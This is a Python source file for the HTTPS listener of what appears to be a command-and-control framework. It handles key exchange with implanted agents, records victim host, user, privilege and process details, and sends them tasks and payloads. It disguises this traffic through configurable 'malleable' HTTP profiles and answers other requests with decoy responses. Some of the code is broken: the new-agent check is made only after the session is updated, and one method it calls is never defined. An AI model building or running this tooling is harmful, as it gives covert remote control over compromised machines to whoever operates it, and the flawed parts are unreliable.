"""
HTTPS listener using aiohttp.

Handles agent check-ins, task dispatch, result collection, and key exchange.
Applies malleable profile transforms to all HTTP traffic.
"""

import asyncio
import logging
import ssl
import struct
from datetime import datetime
from pathlib import Path
from typing import Optional
from uuid import UUID

from aiohttp import web

from .base import BaseListener
from ..core.session_manager import SessionManager, AgentSession
from ..core.task_manager import TaskManager
from ..core.events import event_bus, EventBus
from ..crypto import aes_gcm, key_exchange, nonce
from ..crypto.rsa import load_private_key, rsa_decrypt
from ..protocol.commands import (
    Command, TlvType, TaskType, TaskStatus, DEFAULT_MAGIC, HEADER_SIZE,
)
from ..protocol.tlv import TlvBuilder, iter_tlv, find_tlv, find_tlv_string, find_tlv_uint32, find_tlv_uint8
from ..protocol.packet import pack_packet, unpack_packet_header, validate_packet, pack_command, unpack_command
from ..profiles.parser import MalleableProfile
from ..logging.operator_logger import OperatorLogger

log = logging.getLogger(__name__)


class HttpsListener(BaseListener):

    def __init__(
        self,
        listener_id: int,
        host: str,
        port: int,
        session_manager: SessionManager,
        task_manager: TaskManager,
        profile: MalleableProfile,
        logger: OperatorLogger,
        rsa_private_key_path: Optional[Path] = None,
        cert_path: Optional[Path] = None,
        key_path: Optional[Path] = None,
        magic: int = DEFAULT_MAGIC,
    ):
        super().__init__(listener_id, "HTTPS" if cert_path else "HTTP")
        self.host = host
        self.port = port
        self.session_manager = session_manager
        self.task_manager = task_manager
        self.profile = profile
        self.logger = logger
        self.magic = magic

        self._rsa_private_key = None
        if rsa_private_key_path and rsa_private_key_path.exists():
            self._rsa_private_key = load_private_key(rsa_private_key_path)

        self._cert_path = cert_path
        self._key_path = key_path
        self._app: Optional[web.Application] = None
        self._runner: Optional[web.AppRunner] = None
        self._site: Optional[web.TCPSite] = None

        # Pending key exchanges: agent_id → (server_private_key, server_public_bytes)
        self._pending_kex: dict[str, tuple] = {}

    async def start(self):
        self._app = web.Application()

        # Register routes for all profile URI paths
        for uri_path in self.profile.uri_paths:
            self._app.router.add_route("*", uri_path, self._handle_request)

        # Catch-all for unmatched paths
        self._app.router.add_route("*", "/{path:.*}", self._handle_decoy)

        self._runner = web.AppRunner(self._app, access_log=None)
        await self._runner.setup()

        ssl_ctx = None
        if self._cert_path and self._key_path:
            ssl_ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
            ssl_ctx.load_cert_chain(str(self._cert_path), str(self._key_path))

        self._site = web.TCPSite(self._runner, self.host, self.port, ssl_context=ssl_ctx)
        await self._site.start()
        self.running = True
        log.info(f"[*] {self.listener_type} listener started on {self.host}:{self.port}")

    async def stop(self):
        if self._runner:
            await self._runner.cleanup()
        self.running = False
        log.info(f"[*] {self.listener_type} listener stopped on {self.host}:{self.port}")

    def info(self) -> dict:
        return {
            "id": self.listener_id,
            "type": self.listener_type,
            "interface": self.host,
            "port": self.port,
            "status": "RUNNING" if self.running else "STOPPED",
            "profile": self.profile.name,
        }

    async def _handle_decoy(self, request: web.Request) -> web.Response:
        decoy = self.profile.generate_decoy_response()
        return web.Response(
            status=decoy["status"],
            content_type=decoy["content_type"],
            body=decoy["body"],
            headers=decoy.get("headers", {}),
        )

    async def _handle_request(self, request: web.Request) -> web.Response:
        try:
            # Extract C2 data from the request per malleable profile
            raw_data = await self._extract_request_data(request)
            if raw_data is None or len(raw_data) < HEADER_SIZE:
                return await self._handle_decoy(request)

            # Parse outer packet header
            magic, size, msg_id = unpack_packet_header(raw_data)
            if magic != self.magic:
                return await self._handle_decoy(request)

            encrypted_payload = raw_data[HEADER_SIZE:size]
            if not encrypted_payload:
                return await self._handle_decoy(request)

            # Try to identify agent and decrypt
            agent_id, plaintext = self._decrypt_and_identify(encrypted_payload)

            if plaintext is None:
                return await self._handle_decoy(request)

            # Parse command
            cmd, body = unpack_command(plaintext)

            if cmd == Command.KEY_EXCHANGE_INIT:
                return await self._handle_key_exchange(agent_id, body, request)

            elif cmd == Command.CHECKIN_REQUEST:
                return await self._handle_checkin(agent_id, body, request)

            elif cmd == Command.TASK_RESULT:
                return await self._handle_task_result(agent_id, body, request)

            elif cmd == Command.HEARTBEAT:
                return await self._handle_heartbeat(agent_id, request)

            else:
                log.warning(f"Unknown command 0x{cmd:02X} from {agent_id}")
                return await self._handle_decoy(request)

        except Exception as e:
            log.error(f"Error handling request: {e}", exc_info=True)
            return await self._handle_decoy(request)

    async def _extract_request_data(self, request: web.Request) -> Optional[bytes]:
        """Extract C2 data from HTTP request based on malleable profile."""
        emb = self.profile.request_embedding

        if emb.location == "cookie":
            cookie_val = request.cookies.get(emb.param_name, "")
            if not cookie_val:
                return None
            return self.profile.decode_data(cookie_val, emb)

        elif emb.location == "header":
            header_val = request.headers.get(emb.param_name, "")
            if not header_val:
                return None
            return self.profile.decode_data(header_val, emb)

        elif emb.location == "body":
            body = await request.read()
            if not body:
                return None
            return self.profile.decode_data(body.decode("latin-1"), emb)

        elif emb.location == "uri_param":
            param_val = request.query.get(emb.param_name, "")
            if not param_val:
                return None
            return self.profile.decode_data(param_val, emb)

        return None

    def _decrypt_and_identify(self, encrypted_payload: bytes) -> tuple[Optional[str], Optional[bytes]]:
        """
        Try to decrypt the payload, identifying the agent.
        For key exchange: uses RSA.
        For established sessions: tries session keys.
        """
        # First 16 bytes could be agent_id hint (design choice)
        # For now, try each active session's key
        for session in self.session_manager.all_sessions():
            if not session.encryption_key:
                continue
            try:
                plaintext = aes_gcm.decrypt(session.encryption_key, encrypted_payload)
                self.logger.log_raw_traffic(
                    "AGENT→C2", session.agent_id,
                    encrypted_payload, len(plaintext)
                )
                return session.agent_id, plaintext
            except Exception:
                continue

        # Could be a key exchange — try RSA decrypt
        if self._rsa_private_key:
            try:
                plaintext = rsa_decrypt(self._rsa_private_key, encrypted_payload)
                # Key exchange payload starts with agent_id (16 bytes UUID)
                # followed by the actual ECDH public key
                if len(plaintext) >= 16:
                    agent_id = UUID(bytes=plaintext[:16]).hex
                    # Re-wrap as a proper command payload for processing
                    inner = pack_command(Command.KEY_EXCHANGE_INIT, plaintext[16:])
                    return agent_id, inner
            except Exception:
                pass

        return None, None

    async def _handle_key_exchange(self, agent_id: str, body: bytes,
                                   request: web.Request) -> web.Response:
        """Handle ECDH key exchange initialization."""
        if len(body) < 65:
            log.warning(f"Key exchange body too short from {agent_id}")
            return await self._handle_decoy(request)

        agent_pub_bytes = body[:65]

        # Generate server ECDH keypair
        server_priv, server_pub_bytes = key_exchange.generate_keypair()

        # Derive session key
        agent_id_bytes = bytes.fromhex(agent_id) if len(agent_id) == 32 else agent_id.encode()[:16]
        session_key = key_exchange.derive_session_key(
            server_priv, agent_pub_bytes, salt=agent_id_bytes
        )

        # Create or update session
        session = self.session_manager.get(agent_id)
        if not session:
            session = AgentSession(agent_id=agent_id)
            session.c2_channel = self.listener_type
            session.listener_id = self.listener_id
            self.session_manager.register(session)

        session.encryption_key = session_key
        session.peer_public_key = agent_pub_bytes
        session.nonce_manager = nonce.NonceManager(
            agent_id_prefix=agent_id_bytes[:4], is_server=True
        )
        session.update_last_seen()

        log.info(f"[+] Key exchange completed with agent {agent_id[:8]}")

        # Build response with server public key.
        # The server_pub is sent in CLEARTEXT before the encrypted portion
        # so the agent can derive the same session key before decrypting.
        # Wire format: PACKET_HEADER(12) + SERVER_PUB(65) + AES_GCM_ENCRYPTED
        resp_plaintext = pack_command(Command.KEY_EXCHANGE_RESP, server_pub_bytes)
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted_resp = aes_gcm.encrypt(session_key, nonce_bytes, resp_plaintext)

        # Prepend server_pub before encrypted data
        combined_payload = server_pub_bytes + encrypted_resp
        packet = pack_packet(combined_payload, 0, self.magic)

        return self._build_profile_response(packet)

    async def _handle_checkin(self, agent_id: str, body: bytes,
                              request: web.Request) -> web.Response:
        """Handle agent check-in: update metadata, dispatch pending tasks."""
        session = self.session_manager.get(agent_id)
        if not session:
            return await self._handle_decoy(request)

        # Update session metadata from TLVs
        self._update_session_from_checkin(session, body)
        session.update_last_seen()

        # Check if this is a new agent (first real check-in after key exchange)
        is_new = not session.hostname
        self._update_session_from_checkin(session, body)

        if is_new and session.hostname:
            log.info(
                f"[+] New agent check-in: {session.hostname} "
                f"({session.username}) PID:{session.pid} "
                f"[{session.integrity}] [{session.arch}]"
            )
            await event_bus.emit(
                EventBus.AGENT_CHECKIN,
                session=session, is_new=True
            )
        else:
            await event_bus.emit(
                EventBus.AGENT_CHECKIN,
                session=session, is_new=False
            )

        # Flush pending tasks
        tasks = self.task_manager.flush_pending(session)

        # Build response with tasks
        resp_body = TlvBuilder()
        for task in tasks:
            resp_body.add_uuid(TlvType.TASK_ID, bytes.fromhex(task.task_id.replace("-", ""))[:16])
            resp_body.add_uint8(TlvType.TASK_TYPE, task.task_type)
            resp_body.add_string(TlvType.MODULE_NAME, task.module_name)
            if task.payload:
                resp_body.add_bytes(TlvType.TASK_PAYLOAD, task.payload)
            if task.arguments:
                resp_body.add_bytes(TlvType.TASK_ARGUMENTS, task.arguments)
            resp_body.add_uint32(TlvType.TASK_TIMEOUT, task.timeout_seconds)

        resp_plaintext = pack_command(Command.CHECKIN_RESPONSE, resp_body.build())
        return self._encrypt_and_respond(session, resp_plaintext)

    async def _handle_task_result(self, agent_id: str, body: bytes,
                                  request: web.Request) -> web.Response:
        """Handle task result from agent."""
        session = self.session_manager.get(agent_id)
        if not session:
            return await self._handle_decoy(request)

        session.update_last_seen()

        task_id_bytes = find_tlv(body, TlvType.TASK_ID)
        result_data = find_tlv(body, TlvType.RESULT_OUTPUT) or b""
        status_byte = find_tlv_uint8(body, TlvType.RESULT_STATUS)
        error_msg = find_tlv_string(body, TlvType.RESULT_ERROR_MSG)

        if task_id_bytes:
            task_id = UUID(bytes=task_id_bytes[:16]).hex if len(task_id_bytes) >= 16 else task_id_bytes.hex()

            task = session.active_tasks.get(task_id)
            if task:
                success = (status_byte == 0) if status_byte is not None else True

                # Check for chunked result
                chunk_seq = find_tlv_uint32(body, TlvType.RESULT_CHUNK_SEQ)
                chunk_total = find_tlv_uint32(body, TlvType.RESULT_CHUNK_TOTAL)

                if chunk_total is not None and chunk_total > 1:
                    completed = self.task_manager.handle_chunk(
                        session, task, result_data, success,
                        chunk_seq if chunk_seq is not None else 0,
                        chunk_total,
                    )
                    if not completed:
                        # More chunks expected — send ACK and return
                        resp_plaintext = pack_command(Command.TASK_RESULT_ACK, b"")
                        return await self._send_encrypted_response(session, resp_plaintext, request)
                else:
                    self.task_manager.mark_complete(session, task, result_data, success)

                # Log result
                duration_ms = None
                if task.completed_at and task.sent_at:
                    duration_ms = (task.completed_at - task.sent_at).total_seconds() * 1000

                self.logger.log_result(
                    agent_id, session.hostname, task.task_id,
                    task.module_name, task.status.name, duration_ms,
                    result_data[:200].decode("utf-8", errors="replace") if result_data else ""
                )

                await event_bus.emit(
                    EventBus.TASK_RESULT,
                    session=session, task=task
                )

        # ACK
        resp_plaintext = pack_command(Command.TASK_RESULT_ACK, b"")
        return self._encrypt_and_respond(session, resp_plaintext)

    async def _handle_heartbeat(self, agent_id: str,
                                request: web.Request) -> web.Response:
        session = self.session_manager.get(agent_id)
        if not session:
            return await self._handle_decoy(request)

        session.update_last_seen()
        resp_plaintext = pack_command(Command.HEARTBEAT_ACK, b"")
        return self._encrypt_and_respond(session, resp_plaintext)

    def _update_session_from_checkin(self, session: AgentSession, body: bytes):
        """Update session metadata from check-in TLV body."""
        for entry in iter_tlv(body):
            t, v = entry.type, entry.value
            try:
                if t == TlvType.HOSTNAME:
                    session.hostname = v.decode("utf-8")
                elif t == TlvType.USERNAME:
                    session.username = v.decode("utf-8")
                elif t == TlvType.PID:
                    session.pid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.PPID:
                    session.ppid = struct.unpack("<I", v[:4])[0]
                elif t == TlvType.ARCH:
                    session.arch = "x64" if v[0] == 0x02 else "x86"
                elif t == TlvType.OS_VERSION:
                    session.os_version = v.decode("utf-8")
                elif t == TlvType.INTEGRITY:
                    levels = {0: "LOW", 1: "MEDIUM", 2: "HIGH", 3: "SYSTEM"}
                    session.integrity = levels.get(v[0], "UNKNOWN")
                elif t == TlvType.IS_ADMIN:
                    session.is_admin = bool(v[0])
                elif t == TlvType.PROCESS_NAME:
                    session.process_name = v.decode("utf-8")
                elif t == TlvType.DOTNET_VERSION:
                    session.dotnet_version = v.decode("utf-8")
                elif t == TlvType.AGENT_VERSION:
                    session.agent_version = v.decode("utf-8")
                elif t == TlvType.CWD:
                    session.cwd = v.decode("utf-8")
            except Exception:
                continue

    def _encrypt_and_respond(self, session: AgentSession,
                             plaintext: bytes) -> web.Response:
        """Encrypt plaintext and build an HTTP response per profile."""
        nonce_bytes = session.nonce_manager.next_nonce()
        encrypted = aes_gcm.encrypt(session.encryption_key, nonce_bytes, plaintext)
        packet = pack_packet(encrypted, 0, self.magic)

        self.logger.log_raw_traffic(
            "C2→AGENT", session.agent_id, encrypted, len(plaintext)
        )

        return self._build_profile_response(packet)

    def _build_profile_response(self, packet: bytes) -> web.Response:
        """Apply malleable profile transforms to response."""
        resp_emb = self.profile.response_embedding

        # Encode packet per response encoding (base64/base64url/hex/raw)
        import base64 as _b64
        if resp_emb.encoding == "base64url":
            encoded = _b64.urlsafe_b64encode(packet).decode()
        elif resp_emb.encoding == "hex":
            encoded = packet.hex()
        elif resp_emb.encoding == "raw":
            encoded = packet.decode("latin-1")
        else:  # default: base64
            encoded = _b64.b64encode(packet).decode()

        if resp_emb.location == "body":
            body_content = self.profile.wrap_response(encoded)
            headers = dict(self.profile.response_headers)
            # aiohttp requires charset separate from content_type
            ct = resp_emb.content_type
            charset = None
            if "charset=" in ct:
                parts = ct.split(";")
                ct = parts[0].strip()
                for p in parts[1:]:
                    if "charset=" in p:
                        charset = p.split("=")[1].strip()
            return web.Response(
                status=200,
                content_type=ct,
                charset=charset,
                body=body_content,
                headers=headers,
            )
        else:
            # Header-based response
            headers = dict(self.profile.response_headers)
            headers[resp_emb.location] = encoded
            return web.Response(status=200, headers=headers)
